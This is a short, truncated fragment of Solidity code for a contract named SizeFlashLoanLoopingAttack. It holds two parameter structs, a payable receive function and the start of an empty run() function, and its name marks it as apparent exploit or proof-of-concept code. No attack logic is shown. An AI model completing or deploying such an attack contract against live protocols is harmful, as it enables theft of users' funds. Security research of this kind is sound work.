contract SizeFlashLoanLoopingAttack {
    struct DepositParams {
        address token;
        uint256 amount;
        address to;
    }

    struct GenericRouteParams {
        address router;
        address tokenIn;
        bytes data;
    }

    receive() external payable {}

    function run() external {
